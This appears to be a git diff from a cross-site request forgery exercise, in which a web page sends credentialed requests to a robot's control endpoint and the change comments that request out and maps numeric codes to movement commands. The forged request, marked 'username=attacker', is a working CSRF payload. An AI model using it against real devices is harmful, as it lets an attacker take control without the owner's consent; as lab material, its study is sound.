@@ -22,19 +22,20 @@ $( document ).ready(function() {
     $("#submit").mouseup(()=>{
         var commands = $("#commands").val()
         send_complex_commands(commands)
+        $("#commands").val("")
     });
 });
 
 function send_csrf(command){
     // trivial commands
-	var request = new XMLHttpRequest();
-	var params = "username=attacker";
-	request.open('GET', "http://<%= robot_ip %>:3000/control/"+command, true);
-	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	request.setRequestHeader("Content-length", params.length);
-	request.withCredentials = true;
-	request.setRequestHeader("Connection", "close");
-	request.send(params);
+	// var request = new XMLHttpRequest();
+	// var params = "username=attacker";
+	// request.open('GET', "http://<%= robot_ip %>:3000/control/"+command, true);
+	// request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	// request.setRequestHeader("Content-length", params.length);
+	// request.withCredentials = true;
+	// request.setRequestHeader("Connection", "close");
+	// request.send(params);
 }
 
 function send_complex_commands(commands){
@@ -54,7 +55,18 @@ function send_complex_commands(commands){
     .then((data) => {
         console.log(data)
         for (let i = 0; i < data["commands"]; i++){
-            send_csrf(data["command"][i])
+            if (data["command"][i] === '1'){
+                send_csrf("left")
+            }
+            else if (data["command"][i] === '2'){
+                send_csrf("right")
+            }
+            else if (data["command"][i] === '3'){
+                send_csrf("up")
+            }
+            else if (data["command"][i] === '4'){
+                send_csrf("down")
+            }
         }
     })
     .catch(error => console.log(error));
